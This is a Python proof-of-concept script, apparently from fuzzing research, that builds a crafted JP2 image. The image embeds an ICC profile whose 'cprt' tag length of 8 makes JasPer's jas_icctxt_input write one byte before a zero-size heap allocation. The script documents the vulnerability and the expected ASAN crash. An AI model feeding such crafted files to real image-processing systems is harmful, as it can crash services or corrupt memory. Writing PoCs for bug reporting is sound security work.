#!/usr/bin/env python3
"""
PoC generator for VULN 002 - Heap buffer underwrite in jas_icctxt_input when cnt is zero.

Vulnerability: In jas_iccprof_load(), when tagtabent->len == 8:
  len = tagtabent->len - 8 = 0
  => jas_icctxt_input(attrval, in, cnt=0) is called
  => jas_malloc(0) returns non-NULL (system malloc(0) with ASAN returns non-NULL)
  => jas_stream_read(in, string, 0) returns 0 == cnt, passes check
  => txt->string[cnt - 1] = txt->string[-1] = '\0'
     --> Writes 1 byte BEFORE the 0-byte allocation = left redzone
     --> ASAN: heap-buffer-overflow (heap underwrite)

Strategy:
  - Build a minimal JP2 file with COLR box method=2 (ICC profile).
  - Embed a crafted ICC profile with one 'cprt' tag whose tag-table entry
    has len=8 (only the 8-byte type header, no string data).
  - Use the valid JPEG-2000 codestream from 109-PoC.jp2 (32x32, 2 components)
    as the jp2c content, so jpc_decode() succeeds.
"""

import struct
import sys
import os

POC_DIR = os.path.dirname(os.path.abspath(__file__))
TEMPLATE_JP2 = "/data/ylwang/non-textfuzz/target/jasper/data/test/good/109-PoC.jp2"
OUT_FILE = os.path.join(POC_DIR, "vuln_002.jp2")


# ---------------------------------------------------------------------------
# ICC profile construction
# ---------------------------------------------------------------------------

def build_icc_profile():
    """
    Build a minimal ICC profile with one 'cprt' tag whose tag-table entry
    len=8. This makes cnt = tagtabent->len - 8 = 0, triggering the bug.

    Layout:
      [0  .. 127] : 128-byte ICC header
      [128 .. 131]: tag count = 1 (uint32 BE)
      [132 .. 143]: tag table entry for 'cprt':
                    sig=cprt(4B), off=144(4B), len=8(4B)
      [144 .. 151]: tag data: type='text'(4B) + reserved(4B)
    Total: 152 bytes
    """
    ICC_HDR_LEN = 128
    num_tags    = 1
    tag_tbl_sz  = num_tags * 12          # 12 bytes per entry
    tag_data_off = ICC_HDR_LEN + 4 + tag_tbl_sz  # = 128+4+12 = 144
    icc_size    = tag_data_off + 8       # = 152

    # --- header (128 bytes) ---
    # Fields consumed by jas_iccprof_readhdr (none are validated):
    #   size(4) cmmtype(4) version(4) clas(4) colorspc(4) refcolorspc(4)
    #   ctime(12) magic(4) platform(4) flags(4) maker(4) model(4)
    #   attr(8) intent(4) illum(12) creator(4) reserved-gobble(44)
    hdr  = struct.pack(">I", icc_size)   # profile size
    hdr += b'\x00' * 4                   # cmmtype
    hdr += b'\x04\x30\x00\x00'          # version 4.3.0
    hdr += b'mntr'                       # profile class (display)
    hdr += b'RGB '                       # color space
    hdr += b'XYZ '                       # PCS
    hdr += b'\x00' * 12                  # date/time (ctime, 6 x uint16)
    hdr += b'acsp'                       # magic signature
    hdr += b'\x00' * 4                   # platform
    hdr += b'\x00' * 4                   # flags
    hdr += b'\x00' * 4                   # device manufacturer
    hdr += b'\x00' * 4                   # device model
    hdr += b'\x00' * 8                   # attributes (uint64)
    hdr += b'\x00' * 4                   # rendering intent
    hdr += b'\x00' * 12                  # PCS illuminant XYZ (3 x uint32)
    hdr += b'\x00' * 4                   # creator
    hdr += b'\x00' * 44                  # profile ID + reserved (gobbled)
    assert len(hdr) == ICC_HDR_LEN, f"ICC header size {len(hdr)} != {ICC_HDR_LEN}"

    # --- tag count (4 bytes BE) ---
    tag_count = struct.pack(">I", num_tags)

    # --- tag table entry (12 bytes) ---
    # sig='cprt'(0x63707274), offset=144, len=8  <-- KEY: len=8 makes cnt=0
    TAG_CPRT = 0x63707274   # 'cprt'
    tag_entry = struct.pack(">III", TAG_CPRT, tag_data_off, 8)

    # --- tag data at offset 144 (8 bytes) ---
    # type='text'(0x74657874) + reserved(4B zero)
    TYPE_TEXT = 0x74657874   # 'text'
    tag_data = struct.pack(">II", TYPE_TEXT, 0)

    icc_profile = hdr + tag_count + tag_entry + tag_data
    assert len(icc_profile) == icc_size, f"ICC size mismatch: {len(icc_profile)} vs {icc_size}"
    return icc_profile


# ---------------------------------------------------------------------------
# JP2 box helpers
# ---------------------------------------------------------------------------

def box(type_bytes: bytes, data: bytes) -> bytes:
    """Return a JP2 box with the given 4-byte type and data."""
    length = 8 + len(data)
    return struct.pack(">I", length) + type_bytes + data


def box_zero_length(type_bytes: bytes, data: bytes) -> bytes:
    """Return a JP2 box with length=0 (extends to EOF), used for jp2c."""
    return struct.pack(">I", 0) + type_bytes + data


# ---------------------------------------------------------------------------
# Extract jp2c codestream from template JP2
# ---------------------------------------------------------------------------

def extract_jpc_codestream(jp2_path: str) -> bytes:
    """
    Parse boxes in the JP2 file to locate the jp2c box and return its
    content (the raw JPEG-2000 codestream bytes).
    """
    JP2C_TYPE = b'jp2c'
    with open(jp2_path, 'rb') as f:
        raw = f.read()

    offset = 0
    while offset < len(raw):
        if offset + 8 > len(raw):
            break
        box_len = struct.unpack(">I", raw[offset:offset+4])[0]
        box_type = raw[offset+4:offset+8]
        if box_len == 0:
            # Box extends to EOF
            data_start = offset + 8
            content = raw[data_start:]
            content_end = len(raw)
        elif box_len < 8:
            break
        else:
            data_start = offset + 8
            content = raw[data_start:offset + box_len]
            content_end = offset + box_len

        if box_type == JP2C_TYPE:
            return content

        offset = content_end

    raise ValueError(f"jp2c box not found in {jp2_path}")


# ---------------------------------------------------------------------------
# Build the complete JP2 file
# ---------------------------------------------------------------------------

def build_jp2(icc_profile: bytes, jpc_data: bytes) -> bytes:
    # 1. JP signature box (12 bytes, fixed)
    jp_sig = struct.pack(">I", 12) + b'jP  ' + b'\x0d\x0a\x87\x0a'

    # 2. File Type box
    ftyp_data = (b'jp2 '           # brand
                 + b'\x00\x00\x00\x00'  # MinV
                 + b'jp2 ')        # compatibility list
    ftyp_box = box(b'ftyp', ftyp_data)

    # 3. ihdr sub-box: 32x32, 2 components (matches codestream), 8-bit, comptype=7
    # height(4B BE) + width(4B BE) + ncomp(2B BE) + bpc(1B) + comptype(1B) + unk(1B) + ip(1B)
    # ihdr: height(4B) + width(4B) + ncomp(2B) + bpc(1B) + comptype(1B) + unk(1B) + ip(1B)
    ihdr_data = (struct.pack(">I", 32)   # height
               + struct.pack(">I", 32)   # width
               + struct.pack(">H", 2)    # ncomp
               + bytes([7, 7, 0, 0]))    # bpc, comptype, unk, ip
    ihdr_box = box(b'ihdr', ihdr_data)

    # 4. colr sub-box: method=2 (ICC), prec=0, approx=0, ICC profile bytes
    colr_data = bytes([2, 0, 0]) + icc_profile   # method=2, prec=0, approx=0
    colr_box = box(b'colr', colr_data)

    # 5. jp2h superbox containing ihdr + colr
    jp2h_data = ihdr_box + colr_box
    jp2h_box = box(b'jp2h', jp2h_data)

    # 6. jp2c box (length=0 = extends to EOF)
    jp2c_box = box_zero_length(b'jp2c', jpc_data)

    return jp_sig + ftyp_box + jp2h_box + jp2c_box


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    print("[*] Building crafted ICC profile...")
    icc_profile = build_icc_profile()
    print(f"    ICC profile size: {len(icc_profile)} bytes")

    print(f"[*] Extracting jp2c codestream from {TEMPLATE_JP2} ...")
    jpc_data = extract_jpc_codestream(TEMPLATE_JP2)
    print(f"    Codestream size: {len(jpc_data)} bytes")

    print("[*] Building JP2 file...")
    jp2_bytes = build_jp2(icc_profile, jpc_data)
    print(f"    Total JP2 size: {len(jp2_bytes)} bytes")

    with open(OUT_FILE, 'wb') as f:
        f.write(jp2_bytes)
    print(f"[*] Written to {OUT_FILE}")

    # Dump key structure for verification
    icc_off = 8 + 20 + 8 + 14 + 8 + 3  # after jp_sig + ftyp + jp2h_hdr + ihdr_box + colr_hdr + method/prec/approx
    print(f"\n[*] ICC profile layout (within colr box data, after method/prec/approx):")
    print(f"    Header       : bytes   0-127 (profile size at [0:4] = {len(icc_profile):08x})")
    print(f"    Tag count    : bytes 128-131 = 1")
    print(f"    Tag entry[0] : bytes 132-143 (cprt, off=144, len=8) <- KEY: len=8 => cnt=0")
    print(f"    Tag data     : bytes 144-151 (type='text', reserved)")
    print(f"\n[*] Expected crash: jas_icctxt_input() called with cnt=0")
    print(f"    => malloc(0) returns non-NULL ptr")
    print(f"    => ptr[-1] = 0  (writes 1 byte before 0-byte allocation)")
    print(f"    => ASAN: heap-buffer-overflow (underwrite)")


if __name__ == '__main__':
    main()
